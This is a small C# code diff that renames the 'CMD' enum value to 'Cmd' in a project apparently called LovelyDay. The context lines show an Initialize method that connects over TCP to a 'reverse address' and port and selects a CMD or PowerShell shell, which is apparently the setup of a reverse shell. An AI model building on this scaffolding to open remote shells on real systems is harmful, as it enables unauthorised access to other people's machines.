@@ -13,7 +13,7 @@ namespace LovelyDay
     public enum ShellType
     {
         LovelyDay,
-        CMD,
+        Cmd,
         PowerShell,
         Custom
     }
@@ -26,7 +26,7 @@ namespace LovelyDay
         private static StreamWriter ourStreamWriter;
         private static IShell ourShell;
 
-        public static void Initialize(IPAddress aReverseAddress, int aPort, ShellType aShellType = ShellType.CMD)
+        public static void Initialize(IPAddress aReverseAddress, int aPort, ShellType aShellType = ShellType.Cmd)
         {
             ourClient = new TcpClient();
             ourClient.Connect(aReverseAddress, aPort);
